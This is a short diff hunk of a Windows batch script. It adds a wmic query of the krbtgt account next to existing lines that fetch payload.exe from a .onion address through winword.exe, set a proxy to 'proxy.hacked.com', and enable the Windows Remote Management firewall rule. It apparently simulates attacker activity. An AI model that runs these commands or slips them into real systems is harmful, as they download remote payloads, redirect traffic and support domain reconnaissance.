@@ -513,6 +513,8 @@ winword.exe http://bcdyzitklmnprti.onion/payload.exe
 ECHO ============================
 netsh winhttp set proxy "proxy.hacked.com:8080"; 127.0.0.1,localhost
 ECHO ============================
+wmic useraccount where name='krbtgt' get name,fullname,sid
+ECHO ============================
 netsh advfirewall firewall set rule group=”Windows Remote Management” new enable=yes
 ECHO ============================
 netsh winhttp reset proxy
